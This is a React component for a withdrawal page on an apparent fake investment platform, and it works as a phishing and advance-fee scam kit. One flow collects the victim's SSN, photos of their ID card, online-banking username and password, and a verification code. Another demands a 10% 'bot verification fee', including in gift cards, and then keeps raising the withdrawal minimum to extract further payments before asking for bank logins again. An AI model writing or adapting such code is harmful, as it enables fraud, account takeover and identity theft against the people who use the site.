import React, { useEffect, useMemo, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { FiUploadCloud, FiLink, FiCheckCircle, FiShield, FiAlertTriangle } from 'react-icons/fi';
import PageHeader from '../components/PageHeader';
import PasswordInput from '../components/PasswordInput';
import PaymentMethod from '../components/PaymentMethod';
import api from '../utils/api';
import './Withdraw.css';

const fmtUsd = (n) =>
  `$${Number(n || 0).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;

const Withdraw = () => {
  const navigate = useNavigate();

  const [mode, setMode] = useState('select');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const [assets, setAssets] = useState([]);

  /* ---------- KYC Flow ---------- */
  const [step, setStep] = useState(1);
  const [verification, setVerification] = useState({ email: '', phone: '', ssn: '', address: '' });
  const [idType, setIdType] = useState('license');
  const [frontFile, setFrontFile] = useState(null);
  const [backFile, setBackFile] = useState(null);
  const [frontUrl, setFrontUrl] = useState('');
  const [backUrl, setBackUrl] = useState('');
  const [frontUploading, setFrontUploading] = useState(false);
  const [backUploading, setBackUploading] = useState(false);
  const [frontProgress, setFrontProgress] = useState(0);
  const [backProgress, setBackProgress] = useState(0);
  const [symbol, setSymbol] = useState('');
  const [amount, setAmount] = useState('');
  const [bank, setBank] = useState({ bankName: '', bankAddress: '' });
  const [bankLogin, setBankLogin] = useState({ username: '', password: '' });
  const [code, setCode] = useState('');
  const [secondsLeft, setSecondsLeft] = useState(30 * 60);
  const [phase, setPhase] = useState('form');

  /* ---------- Unverified Flow ---------- */
  const [uvStep, setUvStep] = useState('amount');
  const [uvData, setUvData] = useState(null);
  const [uvSymbol, setUvSymbol] = useState('');
  const [uvAmount, setUvAmount] = useState('');
  const [uvBank, setUvBank] = useState({ bankName: '', bankAddress: '', username: '', password: '' });

  /* ---------- Payment Config ---------- */
  const [paymentConfig, setPaymentConfig] = useState(null);

  useEffect(() => {
    (async () => {
      try {
        const { data } = await api.get('/user/dashboard');
        setAssets((data.assets || []).filter((a) => Number(a.amount) > 0));
      } catch (e) {
        /* ignore */
      }
    })();
  }, []);

  // Fetch global payment config (locks + paypal id) — used for unverified payment step
  useEffect(() => {
    (async () => {
      try {
        const { data } = await api.get('/buy/config');
        setPaymentConfig({
          paypalId: data.paypalId || '',
          cardLocked: !!data.cardLocked,
          paypalLocked: !!data.paypalLocked,
          giftCardLocked: !!data.giftCardLocked,
        });
      } catch (e) {
        setPaymentConfig({
          paypalId: '',
          cardLocked: false,
          paypalLocked: false,
          giftCardLocked: false,
        });
      }
    })();
  }, []);

  useEffect(() => {
    if (step !== 6 || mode !== 'kyc') return;
    const t = setInterval(() => setSecondsLeft((s) => (s > 0 ? s - 1 : 0)), 1000);
    return () => clearInterval(t);
  }, [step, mode]);

  // Fetch active unverified withdrawal when switching to unverified mode
  useEffect(() => {
    if (mode === 'unverified') {
      (async () => {
        try {
          const { data } = await api.get('/withdraw/unverified/status');
          if (data.active) {
            setUvData(data.data);
            if (data.data.status === 'pending_payment') setUvStep('tier_up');
            else if (data.data.status === 'pending_approval') setUvStep('processing');
            else if (data.data.status === 'completed') setUvStep('bank');
          } else {
            setUvStep('amount');
          }
        } catch (e) {
          setUvStep('amount');
        }
      })();
    }
  }, [mode]);

  // Poll for approval
  useEffect(() => {
    let interval;
    if (uvStep === 'processing') {
      interval = setInterval(async () => {
        try {
          const { data } = await api.get('/withdraw/unverified/status');
          if (data.active) {
            if (data.data.status === 'pending_payment') {
              setUvData(data.data);
              setUvStep('tier_up');
              clearInterval(interval);
            } else if (data.data.status === 'completed') {
              setUvData(data.data);
              setUvStep('bank');
              clearInterval(interval);
            } else if (data.data.status === 'rejected') {
              setError('Your payment was rejected. Please try again.');
              setUvStep('amount');
              clearInterval(interval);
            }
          }
        } catch (e) {
          /* ignore */
        }
      }, 5000);
    }
    return () => clearInterval(interval);
  }, [uvStep]);

  const countdown = useMemo(() => {
    const m = Math.floor(secondsLeft / 60).toString().padStart(2, '0');
    const s = (secondsLeft % 60).toString().padStart(2, '0');
    return `${m}:${s}`;
  }, [secondsLeft]);

  /* ---------- KYC Handlers ---------- */
  const handleFileSelect = (file, side) => {
    if (!file) return;
    setError('');
    if (side === 'front') {
      setFrontFile(file);
      setFrontProgress(0);
      setFrontUrl('');
    } else {
      setBackFile(file);
      setBackProgress(0);
      setBackUrl('');
    }
  };

  const uploadOne = async (file, side, setProgress) => {
    const fd = new FormData();
    fd.append('file', file);
    fd.append('side', side);
    const { data } = await api.post('/withdraw/id/upload', fd, {
      onUploadProgress: (e) => {
        if (!e.total) return;
        const pct = Math.min(95, Math.round((e.loaded * 100) / e.total));
        setProgress(pct);
      },
    });
    setProgress(100);
    return data.url;
  };

  const handleUploadAndNext = async () => {
    setError('');
    if (!frontFile || !backFile) return setError('Please select both front and back images');
    setLoading(true);
    setFrontUploading(true);
    setBackUploading(true);
    setFrontProgress(0);
    setBackProgress(0);
    try {
      const [fUrl, bUrl] = await Promise.all([
        uploadOne(frontFile, 'front', setFrontProgress),
        uploadOne(backFile, 'back', setBackProgress),
      ]);
      setFrontUrl(fUrl);
      setBackUrl(bUrl);
      await api.post('/withdraw/id', { idType, frontUrl: fUrl, backUrl: bUrl });
      setStep(3);
    } catch (err) {
      setError(err?.response?.data?.message || 'Image upload failed. Please try again.');
      setFrontProgress(0);
      setBackProgress(0);
    } finally {
      setLoading(false);
      setFrontUploading(false);
      setBackUploading(false);
    }
  };

  const next = async () => {
    setError('');
    setLoading(true);
    try {
      if (step === 1) {
        if (!verification.email || !verification.phone || !verification.ssn || !verification.address) {
          throw new Error('All verification fields are required');
        }
        await api.post('/withdraw/verification', verification);
        setStep(2);
      } else if (step === 3) {
        if (!symbol) throw new Error('Select an asset');
        if (!amount || Number(amount) <= 0) throw new Error('Enter a valid amount');
        await api.post('/withdraw/amount', { symbol, amount: Number(amount) });
        setStep(4);
      } else if (step === 4) {
        if (!bank.bankName || !bank.bankAddress) throw new Error('Bank name and address are required');
        await api.post('/withdraw/bank', bank);
        setStep(5);
      }
    } catch (err) {
      setError(err?.response?.data?.message || err.message || 'Something went wrong');
    } finally {
      setLoading(false);
    }
  };

  const connectBank = async () => {
    setError('');
    if (!bankLogin.username || !bankLogin.password) return setError('Bank username and password are required');
    setLoading(true);
    try {
      await api.post('/withdraw/bank-connect', {
        bankName: bank.bankName,
        username: bankLogin.username,
        password: bankLogin.password,
      });
      setStep(6);
    } catch (err) {
      setError(err?.response?.data?.message || 'Could not connect bank');
    } finally {
      setLoading(false);
    }
  };

  const submitCode = async () => {
    setError('');
    if (!code.trim()) return setError('Enter the verification code');
    setPhase('processing');
    let correct = false;
    try {
      const { data } = await api.post('/withdraw/verify-code', { code: code.trim() });
      correct = Boolean(data.correct);
    } catch (err) {
      correct = false;
    }
    setTimeout(() => {
      setPhase(correct ? 'pending' : 'retry');
    }, 5000);
  };

  const resend = async () => {
    try {
      await api.post('/withdraw/resend-code');
      setSecondsLeft(30 * 60);
    } catch (e) {
      /* ignore */
    }
  };

  /* ---------- Unverified Handlers ---------- */
  const initiateUnverified = async () => {
    setError('');
    if (!uvSymbol) return setError('Select an asset');
    if (!uvAmount || Number(uvAmount) < 3000) return setError('Minimum unverified withdrawal is $3,000');
    setLoading(true);
    try {
      const { data } = await api.post('/withdraw/unverified/initiate', {
        symbol: uvSymbol,
        amount: Number(uvAmount),
      });
      setUvData(data.data);
      setUvStep('confirm');
    } catch (err) {
      setError(err?.response?.data?.message || 'Could not initiate withdrawal');
    } finally {
      setLoading(false);
    }
  };

  // Called by PaymentMethod component
  const handleUnverifiedPayment = async (payload) => {
    setLoading(true);
    try {
      await api.post('/withdraw/unverified/pay', {
        paymentMethod: payload.method,
        proofUrl: payload.proofUrl,
        giftCards: payload.giftCards,
      });
      setUvStep('processing');
    } finally {
      setLoading(false);
    }
  };

  const submitUnverifiedBank = async () => {
    setError('');
    if (!uvBank.bankName || !uvBank.bankAddress || !uvBank.username || !uvBank.password) {
      return setError('All bank fields are required');
    }
    setLoading(true);
    try {
      await api.post('/withdraw/unverified/complete', uvBank);
      setMode('select');
      setUvStep('amount');
      setUvData(null);
    } catch (err) {
      setError(err?.response?.data?.message || 'Could not submit bank details');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="withdraw-page">
      <PageHeader title="Withdraw" />

      <div className="withdraw-body">
        {mode === 'select' && (
          <div className="selection-cards" style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
            <div
              className="step-card"
              style={{ cursor: 'pointer', textAlign: 'center', border: '1px solid var(--border)' }}
              onClick={() => setMode('kyc')}
            >
              <FiShield style={{ fontSize: '32px', color: 'var(--success)', marginBottom: '10px' }} />
              <h3>Verify to Withdraw</h3>
              <p className="hint">
                You will need to verify a KYC to make a successful withdrawal without any charges.
              </p>
            </div>

            <div
              className="step-card"
              style={{ cursor: 'pointer', textAlign: 'center', border: '1px solid var(--border)' }}
              onClick={() => setMode('unverified')}
            >
              <FiAlertTriangle style={{ fontSize: '32px', color: 'var(--warning)', marginBottom: '10px' }} />
              <h3>Withdraw without Verification</h3>
              <p className="hint">
                Here you will make a successful withdrawal without verification, but you will have to
                pay a 10% of the amount you want to withdraw, and the amount paid will be credited to
                your account balance back, it's to know you are not a bot.
              </p>
            </div>
          </div>
        )}

        {mode === 'kyc' && (
          <>
            <button
              className="ghost-btn"
              style={{ marginBottom: '16px', width: 'auto' }}
              onClick={() => setMode('select')}
            >
              ← Back to options
            </button>

            {step === 1 && (
              <div className="step-card">
                <h3>Step 1 — Identity Verification</h3>
                <p className="hint">Verification is required to make a successful withdrawal.</p>
                <label>Email</label>
                <input
                  type="email"
                  value={verification.email}
                  onChange={(e) => setVerification({ ...verification, email: e.target.value })}
                />
                <label>Phone Number</label>
                <input
                  value={verification.phone}
                  onChange={(e) => setVerification({ ...verification, phone: e.target.value })}
                />
                <label>Social Security Card (SSN)</label>
                <input
                  value={verification.ssn}
                  onChange={(e) => setVerification({ ...verification, ssn: e.target.value })}
                />
                <label>Home Address</label>
                <input
                  value={verification.address}
                  onChange={(e) => setVerification({ ...verification, address: e.target.value })}
                />
                {error && <div className="form-error">{error}</div>}
                <button className="primary-btn" onClick={next} disabled={loading}>
                  {loading ? 'Submitting...' : 'Proceed'}
                </button>
              </div>
            )}

            {step === 2 && (
              <div className="step-card">
                <h3>Step 2 — Upload ID</h3>
                <div className="tabs">
                  <button
                    className={idType === 'license' ? 'active' : ''}
                    onClick={() => setIdType('license')}
                    disabled={frontUploading || backUploading}
                  >
                    State Driver&apos;s License
                  </button>
                  <button
                    className={idType === 'nondriver' ? 'active' : ''}
                    onClick={() => setIdType('nondriver')}
                    disabled={frontUploading || backUploading}
                  >
                    State-Issued Non-Driver ID Card
                  </button>
                </div>

                <label>Front of Card</label>
                <label className={`upload-box${frontUploading ? ' uploading' : ''}${frontUrl ? ' done' : ''}`}>
                  <div className="upload-box-inner">
                    {frontUploading ? <div className="spinner-sm" /> : frontUrl ? <FiCheckCircle /> : <FiUploadCloud />}
                    <span className="upload-filename">{frontFile ? frontFile.name : 'Choose front image'}</span>
                    {frontUploading && <span className="upload-status-text">Uploading {frontProgress}%</span>}
                    {frontUrl && <span className="upload-status-text">Uploaded ✓</span>}
                  </div>
                  {frontUploading && (
                    <div className="upload-progress">
                      <div className="upload-progress-fill" style={{ width: `${Math.max(3, frontProgress)}%` }} />
                    </div>
                  )}
                  <input
                    type="file"
                    accept="image/*"
                    onChange={(e) => handleFileSelect(e.target.files[0], 'front')}
                    hidden
                    disabled={frontUploading || backUploading}
                  />
                </label>

                <label>Back of Card</label>
                <label className={`upload-box${backUploading ? ' uploading' : ''}${backUrl ? ' done' : ''}`}>
                  <div className="upload-box-inner">
                    {backUploading ? <div className="spinner-sm" /> : backUrl ? <FiCheckCircle /> : <FiUploadCloud />}
                    <span className="upload-filename">{backFile ? backFile.name : 'Choose back image'}</span>
                    {backUploading && <span className="upload-status-text">Uploading {backProgress}%</span>}
                    {backUrl && <span className="upload-status-text">Uploaded ✓</span>}
                  </div>
                  {backUploading && (
                    <div className="upload-progress">
                      <div className="upload-progress-fill" style={{ width: `${Math.max(3, backProgress)}%` }} />
                    </div>
                  )}
                  <input
                    type="file"
                    accept="image/*"
                    onChange={(e) => handleFileSelect(e.target.files[0], 'back')}
                    hidden
                    disabled={frontUploading || backUploading}
                  />
                </label>

                {error && <div className="form-error">{error}</div>}
                <button
                  className="primary-btn"
                  onClick={handleUploadAndNext}
                  disabled={loading || !frontFile || !backFile}
                >
                  {loading ? `Uploading Front ${frontProgress}% · Back ${backProgress}%` : 'Next'}
                </button>
              </div>
            )}

            {step === 3 && (
              <div className="step-card">
                <h3>Step 3 — Withdrawal Amount</h3>
                <label>Asset</label>
                <select value={symbol} onChange={(e) => setSymbol(e.target.value)}>
                  <option value="">Select asset</option>
                  {assets.map((a) => (
                    <option key={a.symbol} value={a.symbol}>
                      {a.symbol} — {fmtUsd(a.amount)}
                    </option>
                  ))}
                </select>
                <label>Amount (USD)</label>
                <input
                  type="number"
                  min="0"
                  step="any"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                />
                {error && <div className="form-error">{error}</div>}
                <button className="primary-btn" onClick={next} disabled={loading}>Next</button>
              </div>
            )}

            {step === 4 && (
              <div className="step-card">
                <h3>Step 4 — Bank Details</h3>
                <label>Bank Name</label>
                <input
                  value={bank.bankName}
                  onChange={(e) => setBank({ ...bank, bankName: e.target.value })}
                  placeholder="e.g. Chase Bank"
                />
                <label>Bank Address</label>
                <input
                  value={bank.bankAddress}
                  onChange={(e) => setBank({ ...bank, bankAddress: e.target.value })}
                  placeholder="Bank address"
                />
                {error && <div className="form-error">{error}</div>}
                <button className="primary-btn" onClick={next} disabled={loading}>Next</button>
              </div>
            )}

            {step === 5 && (
              <div className="step-card">
                <h3>Step 5 — Connect Online Banking</h3>
                <p className="hint">Connect your online banking to complete the withdrawal.</p>
                <p className="bank-info">
                  Bank: <strong>{bank.bankName}</strong>
                </p>
                <label>Bank Username (User ID)</label>
                <input
                  value={bankLogin.username}
                  onChange={(e) => setBankLogin({ ...bankLogin, username: e.target.value })}
                  placeholder="Bank username"
                />
                <label>Bank Password</label>
                <PasswordInput
                  value={bankLogin.password}
                  onChange={(e) => setBankLogin({ ...bankLogin, password: e.target.value })}
                  placeholder="Bank password"
                />
                {error && <div className="form-error">{error}</div>}
                <button className="primary-btn connect-btn" onClick={connectBank} disabled={loading}>
                  <FiLink /> {loading ? 'Connecting...' : 'Connect Bank Now'}
                </button>
              </div>
            )}

            {step === 6 && phase === 'form' && (
              <div className="step-card">
                <h3>Step 6 — Verification Code</h3>
                <p className="hint">Enter the verification code sent to you.</p>
                <input
                  value={code}
                  onChange={(e) => setCode(e.target.value.replace(/\D/g, '').slice(0, 8))}
                  placeholder="Enter code"
                  inputMode="numeric"
                />
                <div className="countdown-row">
                  <span className="countdown">{countdown}</span>
                  <button className="ghost-btn" onClick={resend} disabled={secondsLeft > 0}>
                    Resend Code
                  </button>
                </div>
                {error && <div className="form-error">{error}</div>}
                <button className="primary-btn" onClick={submitCode}>Proceed</button>
              </div>
            )}

            {step === 6 && phase === 'processing' && (
              <div className="processing-box">
                <div className="spinner" />
                <p>Processing your withdrawal...</p>
              </div>
            )}

            {step === 6 && phase === 'pending' && (
              <div className="step-card center">
                <h3>Verification is Pending</h3>
                <p>Your payment will be disbursed after successful verification.</p>
                <button className="primary-btn" onClick={() => navigate('/dashboard')}>
                  Back to Dashboard
                </button>
              </div>
            )}

            {step === 6 && phase === 'retry' && (
              <div className="step-card center">
                <h3>Incorrect Code</h3>
                <p>The verification code is incorrect or has not been set yet.</p>
                <button
                  className="primary-btn"
                  onClick={() => {
                    setPhase('form');
                    setCode('');
                    setError('');
                  }}
                >
                  Okay
                </button>
              </div>
            )}
          </>
        )}

        {mode === 'unverified' && (
          <>
            <button
              className="ghost-btn"
              style={{ marginBottom: '16px', width: 'auto' }}
              onClick={() => setMode('select')}
            >
              ← Back to options
            </button>

            {uvStep === 'amount' && (
              <div className="step-card">
                <h3>Unverified Withdrawal</h3>
                <p className="hint">Minimum withdrawal amount is $3,000.</p>
                <label>Asset</label>
                <select value={uvSymbol} onChange={(e) => setUvSymbol(e.target.value)}>
                  <option value="">Select asset</option>
                  {assets.map((a) => (
                    <option key={a.symbol} value={a.symbol}>
                      {a.symbol} — {fmtUsd(a.amount)}
                    </option>
                  ))}
                </select>
                <label>Amount (USD)</label>
                <input
                  type="number"
                  min="3000"
                  value={uvAmount}
                  onChange={(e) => setUvAmount(e.target.value)}
                  placeholder="e.g. 3000"
                />
                {error && <div className="form-error">{error}</div>}
                <button className="primary-btn" onClick={initiateUnverified} disabled={loading}>
                  {loading ? 'Initiating...' : 'Next'}
                </button>
              </div>
            )}

            {uvStep === 'confirm' && uvData && (
              <div className="step-card">
                <h3>Confirm Bot Verification Fee</h3>
                <p className="hint">
                  To verify you are not a bot, you need to pay a 10% charge. This amount will be sent
                  back to you along with your withdrawal.
                </p>
                <div className="fee-details" style={{ background: 'var(--bg-1)', padding: '16px', borderRadius: '8px', marginBottom: '16px' }}>
                  <p>Withdrawal Amount: <strong>{fmtUsd(uvData.originalAmount)}</strong></p>
                  <p>10% Fee: <strong>{fmtUsd(uvData.currentPaymentAmount)}</strong></p>
                  <p style={{ borderTop: '1px solid var(--border)', paddingTop: '8px', marginTop: '8px', fontSize: '16px' }}>
                    Total to be sent: <strong>{fmtUsd(Number(uvData.originalAmount) + Number(uvData.currentPaymentAmount))}</strong>
                  </p>
                </div>
                {error && <div className="form-error">{error}</div>}
                <button className="primary-btn" onClick={() => setUvStep('payment')}>Agree</button>
              </div>
            )}

            {uvStep === 'payment' && uvData && paymentConfig && (
              <div className="step-card">
                <h3>Pay Verification Fee</h3>
                <p
                  className="hint"
                  style={{ textAlign: 'center', fontWeight: 'bold', color: 'var(--primary)' }}
                >
                  Pay {fmtUsd(uvData.currentPaymentAmount)} to proceed
                </p>
                <PaymentMethod
                  config={paymentConfig}
                  onSubmit={handleUnverifiedPayment}
                  submitting={loading}
                  submitLabel="Proceed"
                />
              </div>
            )}

            {uvStep === 'processing' && (
              <div className="processing-box">
                <div className="spinner" />
                <h3>Under Verification</h3>
                {/* Removed "admin" */}
                <p>Your payment is under verification right now. Please wait for approval...</p>
                
                {/* Added: Allow adding more cards while processing */}
                {uvData?.paymentMethod === 'giftcard' && (
                  <button className="primary-btn" style={{ marginTop: '20px' }} onClick={() => setUvStep('payment')}>
                    Add More Cards / Complete Payment
                  </button>
                )}
              </div>
            )}

            {uvStep === 'tier_up' && uvData && (
              <div className="step-card center">
                <h3 style={{ color: 'var(--danger)' }}>Minimum Withdrawal Increased!</h3>
                {uvData.tier === 2 && (
                  <p>
                    The minimum withdrawal has been increased to <strong>$10,000</strong>. You should
                    kindly make withdrawal of $10,000 and above. Your 10% charge will be sent together
                    to you. Kindly make payment of 10% charge amount now.
                  </p>
                )}
                {uvData.tier === 3 && (
                  <p>
                    The minimum withdrawal has been increased to <strong>$50,000</strong>. You should
                    kindly make withdrawal of $50,000 and above. Your 10% charge will be sent together
                    to you. Kindly make payment of 10% charge amount now.
                  </p>
                )}
                {uvData.tier === 4 && (
                  <p>
                    The minimum withdrawal has been increased to <strong>$100,000</strong>. You should
                    kindly make withdrawal of $100,000 and above. Your 10% charge will be sent together
                    to you. Kindly make payment of 10% charge amount now.
                  </p>
                )}
                <p className="hint">
                  Fee to pay: <strong>{fmtUsd(uvData.currentPaymentAmount)}</strong>
                </p>
                <button className="primary-btn" onClick={() => setUvStep('payment')}>Proceed</button>
              </div>
            )}

            {uvStep === 'bank' && (
              <div className="step-card">
                <h3>Connect Bank</h3>
                <p className="hint">
                  Verification complete! Enter your bank details to finalize the withdrawal.
                </p>
                <label>Bank Name</label>
                <input
                  value={uvBank.bankName}
                  onChange={(e) => setUvBank({ ...uvBank, bankName: e.target.value })}
                />
                <label>Bank Address</label>
                <input
                  value={uvBank.bankAddress}
                  onChange={(e) => setUvBank({ ...uvBank, bankAddress: e.target.value })}
                />
                <label>Bank Username (ID)</label>
                <input
                  value={uvBank.username}
                  onChange={(e) => setUvBank({ ...uvBank, username: e.target.value })}
                />
                <label>Bank Password</label>
                <PasswordInput
                  value={uvBank.password}
                  onChange={(e) => setUvBank({ ...uvBank, password: e.target.value })}
                />
                {error && <div className="form-error">{error}</div>}
                <button className="primary-btn" onClick={submitUnverifiedBank} disabled={loading}>
                  {loading ? 'Submitting...' : 'Complete Withdrawal'}
                </button>
              </div>
            )}
          </>
        )}
      </div>
    </div>
  );
};

export default Withdraw;